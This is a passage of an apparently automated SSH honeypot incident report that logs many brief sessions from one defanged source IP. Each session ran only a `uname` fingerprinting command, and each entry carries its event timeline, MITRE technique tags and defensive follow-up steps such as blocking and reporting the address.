| `2026-07-30 03:21:49` | `cowrie.client.version` |
| `2026-07-30 03:21:49` | `cowrie.client.kex` |
| `2026-07-30 03:21:51` | `cowrie.login.success` |
| `2026-07-30 03:21:52` | `cowrie.session.params` |
| `2026-07-30 03:21:52` | `cowrie.command.input` |
| `2026-07-30 03:21:53` | `cowrie.log.closed` |
| `2026-07-30 03:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9d89d64814e

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:49` | `cowrie.session.connect` |
| `2026-07-30 03:21:49` | `cowrie.client.version` |
| `2026-07-30 03:21:50` | `cowrie.client.kex` |
| `2026-07-30 03:21:51` | `cowrie.login.success` |
| `2026-07-30 03:21:54` | `cowrie.session.params` |
| `2026-07-30 03:21:54` | `cowrie.command.input` |
| `2026-07-30 03:21:55` | `cowrie.log.closed` |
| `2026-07-30 03:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dea5cd054f7f

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:50` | `cowrie.session.connect` |
| `2026-07-30 03:21:50` | `cowrie.client.version` |
| `2026-07-30 03:21:51` | `cowrie.client.kex` |
| `2026-07-30 03:21:52` | `cowrie.login.success` |
| `2026-07-30 03:21:54` | `cowrie.session.params` |
| `2026-07-30 03:21:54` | `cowrie.command.input` |
| `2026-07-30 03:21:55` | `cowrie.log.closed` |
| `2026-07-30 03:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a553910280a5

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:51` | `cowrie.session.connect` |
| `2026-07-30 03:21:51` | `cowrie.client.version` |
| `2026-07-30 03:21:51` | `cowrie.client.kex` |
| `2026-07-30 03:21:54` | `cowrie.login.success` |
| `2026-07-30 03:21:55` | `cowrie.session.params` |
| `2026-07-30 03:21:55` | `cowrie.command.input` |
| `2026-07-30 03:21:56` | `cowrie.log.closed` |
| `2026-07-30 03:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a64d75dadefb

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:52` | `cowrie.session.connect` |
| `2026-07-30 03:21:53` | `cowrie.client.version` |
| `2026-07-30 03:22:14` | `cowrie.client.kex` |
| `2026-07-30 03:22:16` | `cowrie.login.success` |
| `2026-07-30 03:22:18` | `cowrie.session.params` |
| `2026-07-30 03:22:18` | `cowrie.command.input` |
| `2026-07-30 03:22:19` | `cowrie.log.closed` |
| `2026-07-30 03:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a79a9be4cb30

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:53` | `cowrie.session.connect` |
| `2026-07-30 03:21:53` | `cowrie.client.version` |
| `2026-07-30 03:21:54` | `cowrie.client.kex` |
| `2026-07-30 03:21:55` | `cowrie.login.success` |
| `2026-07-30 03:21:57` | `cowrie.session.params` |
| `2026-07-30 03:21:57` | `cowrie.command.input` |
| `2026-07-30 03:21:57` | `cowrie.log.closed` |
| `2026-07-30 03:21:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3225baa12d9c

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:54` | `cowrie.session.connect` |
| `2026-07-30 03:21:54` | `cowrie.client.version` |
| `2026-07-30 03:22:00` | `cowrie.client.kex` |
| `2026-07-30 03:22:03` | `cowrie.login.success` |
| `2026-07-30 03:22:04` | `cowrie.session.params` |
| `2026-07-30 03:22:04` | `cowrie.command.input` |
| `2026-07-30 03:22:06` | `cowrie.log.closed` |
| `2026-07-30 03:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f3c0eafef2c

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:54` | `cowrie.session.connect` |
| `2026-07-30 03:21:54` | `cowrie.client.version` |
| `2026-07-30 03:22:00` | `cowrie.client.kex` |
| `2026-07-30 03:22:01` | `cowrie.login.success` |
| `2026-07-30 03:22:03` | `cowrie.session.params` |
| `2026-07-30 03:22:03` | `cowrie.command.input` |
| `2026-07-30 03:22:03` | `cowrie.log.closed` |
| `2026-07-30 03:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7a921fe765b

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:55` | `cowrie.session.connect` |
| `2026-07-30 03:21:55` | `cowrie.client.version` |
| `2026-07-30 03:21:55` | `cowrie.client.kex` |
| `2026-07-30 03:21:57` | `cowrie.login.success` |
| `2026-07-30 03:21:58` | `cowrie.session.params` |
| `2026-07-30 03:21:58` | `cowrie.command.input` |
| `2026-07-30 03:21:58` | `cowrie.log.closed` |
| `2026-07-30 03:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4941161b05f3

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:55` | `cowrie.session.connect` |
| `2026-07-30 03:21:56` | `cowrie.client.version` |
| `2026-07-30 03:21:56` | `cowrie.client.kex` |
| `2026-07-30 03:21:57` | `cowrie.login.success` |
| `2026-07-30 03:21:59` | `cowrie.session.params` |
| `2026-07-30 03:21:59` | `cowrie.command.input` |
| `2026-07-30 03:22:00` | `cowrie.log.closed` |
| `2026-07-30 03:22:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e79fcf295e30

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:56` | `cowrie.session.connect` |
| `2026-07-30 03:21:56` | `cowrie.client.version` |
| `2026-07-30 03:21:57` | `cowrie.client.kex` |
| `2026-07-30 03:21:58` | `cowrie.login.success` |
| `2026-07-30 03:22:00` | `cowrie.session.params` |
| `2026-07-30 03:22:00` | `cowrie.command.input` |
| `2026-07-30 03:22:01` | `cowrie.log.closed` |
| `2026-07-30 03:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7c5530e71c0

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:57` | `cowrie.session.connect` |
| `2026-07-30 03:21:57` | `cowrie.client.version` |
| `2026-07-30 03:21:57` | `cowrie.client.kex` |
| `2026-07-30 03:21:58` | `cowrie.login.success` |
| `2026-07-30 03:22:00` | `cowrie.session.params` |
| `2026-07-30 03:22:00` | `cowrie.command.input` |
| `2026-07-30 03:22:01` | `cowrie.log.closed` |
| `2026-07-30 03:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87a29f2b9a0f

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:21 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:21:58` | `cowrie.session.connect` |
| `2026-07-30 03:21:58` | `cowrie.client.version` |
| `2026-07-30 03:22:00` | `cowrie.client.kex` |
| `2026-07-30 03:22:01` | `cowrie.login.success` |
| `2026-07-30 03:22:02` | `cowrie.session.params` |
| `2026-07-30 03:22:02` | `cowrie.command.input` |
| `2026-07-30 03:22:03` | `cowrie.log.closed` |
| `2026-07-30 03:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8156e495b001

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:00` | `cowrie.session.connect` |
| `2026-07-30 03:22:00` | `cowrie.client.version` |
| `2026-07-30 03:22:01` | `cowrie.client.kex` |
| `2026-07-30 03:22:03` | `cowrie.login.success` |
| `2026-07-30 03:22:05` | `cowrie.session.params` |
| `2026-07-30 03:22:05` | `cowrie.command.input` |
| `2026-07-30 03:22:07` | `cowrie.log.closed` |
| `2026-07-30 03:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a16e2b2ce969

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:00` | `cowrie.session.connect` |
| `2026-07-30 03:22:00` | `cowrie.client.version` |
| `2026-07-30 03:22:11` | `cowrie.client.kex` |
| `2026-07-30 03:22:12` | `cowrie.login.success` |
| `2026-07-30 03:22:13` | `cowrie.session.params` |
| `2026-07-30 03:22:13` | `cowrie.command.input` |
| `2026-07-30 03:22:14` | `cowrie.log.closed` |
| `2026-07-30 03:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9802ff7c5bda

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:00` | `cowrie.session.connect` |
| `2026-07-30 03:22:00` | `cowrie.client.version` |
| `2026-07-30 03:22:03` | `cowrie.client.kex` |
| `2026-07-30 03:22:04` | `cowrie.login.success` |
| `2026-07-30 03:22:07` | `cowrie.session.params` |
| `2026-07-30 03:22:07` | `cowrie.command.input` |
| `2026-07-30 03:22:07` | `cowrie.log.closed` |
| `2026-07-30 03:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e58909d0755

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:01` | `cowrie.session.connect` |
| `2026-07-30 03:22:01` | `cowrie.client.version` |
| `2026-07-30 03:22:03` | `cowrie.client.kex` |
| `2026-07-30 03:22:04` | `cowrie.login.success` |
| `2026-07-30 03:22:06` | `cowrie.session.params` |
| `2026-07-30 03:22:06` | `cowrie.command.input` |
| `2026-07-30 03:22:07` | `cowrie.log.closed` |
| `2026-07-30 03:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e4599af55d6

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:03` | `cowrie.session.connect` |
| `2026-07-30 03:22:03` | `cowrie.client.version` |
| `2026-07-30 03:22:06` | `cowrie.client.kex` |
| `2026-07-30 03:22:07` | `cowrie.login.success` |
| `2026-07-30 03:22:09` | `cowrie.session.params` |
| `2026-07-30 03:22:09` | `cowrie.command.input` |
| `2026-07-30 03:22:09` | `cowrie.log.closed` |
| `2026-07-30 03:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4d28c3d138f

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:03` | `cowrie.session.connect` |
| `2026-07-30 03:22:03` | `cowrie.client.version` |
| `2026-07-30 03:22:05` | `cowrie.client.kex` |
| `2026-07-30 03:22:07` | `cowrie.login.success` |
| `2026-07-30 03:22:08` | `cowrie.session.params` |
| `2026-07-30 03:22:08` | `cowrie.command.input` |
| `2026-07-30 03:22:09` | `cowrie.log.closed` |
| `2026-07-30 03:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d3720210170

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:06` | `cowrie.session.connect` |
| `2026-07-30 03:22:06` | `cowrie.client.version` |
| `2026-07-30 03:22:09` | `cowrie.client.kex` |
| `2026-07-30 03:22:10` | `cowrie.login.success` |
| `2026-07-30 03:22:11` | `cowrie.session.params` |
| `2026-07-30 03:22:11` | `cowrie.command.input` |
| `2026-07-30 03:22:11` | `cowrie.log.closed` |
| `2026-07-30 03:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf71908c9019

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:07` | `cowrie.session.connect` |
| `2026-07-30 03:22:07` | `cowrie.client.version` |
| `2026-07-30 03:22:09` | `cowrie.client.kex` |
| `2026-07-30 03:22:10` | `cowrie.login.success` |
| `2026-07-30 03:22:12` | `cowrie.session.params` |
| `2026-07-30 03:22:12` | `cowrie.command.input` |
| `2026-07-30 03:22:12` | `cowrie.log.closed` |
| `2026-07-30 03:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4c5254faee7

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:07` | `cowrie.session.connect` |
| `2026-07-30 03:22:10` | `cowrie.client.version` |
| `2026-07-30 03:22:10` | `cowrie.client.kex` |
| `2026-07-30 03:22:12` | `cowrie.login.success` |
| `2026-07-30 03:22:14` | `cowrie.session.params` |
| `2026-07-30 03:22:14` | `cowrie.command.input` |
| `2026-07-30 03:22:14` | `cowrie.log.closed` |
| `2026-07-30 03:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdd4d2c9c7ce

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:09` | `cowrie.session.connect` |
| `2026-07-30 03:22:09` | `cowrie.client.version` |
| `2026-07-30 03:22:12` | `cowrie.client.kex` |
| `2026-07-30 03:22:14` | `cowrie.login.success` |
| `2026-07-30 03:22:16` | `cowrie.session.params` |
| `2026-07-30 03:22:16` | `cowrie.command.input` |
| `2026-07-30 03:22:17` | `cowrie.log.closed` |
| `2026-07-30 03:22:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d23589a738d

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:09` | `cowrie.session.connect` |
| `2026-07-30 03:22:09` | `cowrie.client.version` |
| `2026-07-30 03:22:11` | `cowrie.client.kex` |
| `2026-07-30 03:22:12` | `cowrie.login.success` |
| `2026-07-30 03:22:13` | `cowrie.session.params` |
| `2026-07-30 03:22:13` | `cowrie.command.input` |
| `2026-07-30 03:22:14` | `cowrie.log.closed` |
| `2026-07-30 03:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d00cd45ff2c

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:12` | `cowrie.session.connect` |
| `2026-07-30 03:22:12` | `cowrie.client.version` |
| `2026-07-30 03:22:12` | `cowrie.client.kex` |
| `2026-07-30 03:22:15` | `cowrie.login.success` |
| `2026-07-30 03:22:17` | `cowrie.session.params` |
| `2026-07-30 03:22:17` | `cowrie.command.input` |
| `2026-07-30 03:22:17` | `cowrie.log.closed` |
| `2026-07-30 03:22:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b1c26539fd

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-30 03:22 |
| **Last Seen** | 2026-07-30 03:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:22:14` | `cowrie.session.connect` |
| `2026-07-30 03:22:14` | `cowrie.client.version` |
| `2026-07-30 03:22:14` | `cowrie.client.kex` |
| `2026-07-30 03:22:16` | `cowrie.login.success` |
| `2026-07-30 03:22:19` | `cowrie.session.params` |
| `2026-07-30 03:22:19` | `cowrie.command.input` |
| `2026-07-30 03:22:19` | `cowrie.log.closed` |
| `2026-07-30 03:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa6ef549d55

| Field | Detail |
|---|---|
| **Source IP** | `34.38.215[.]120` |
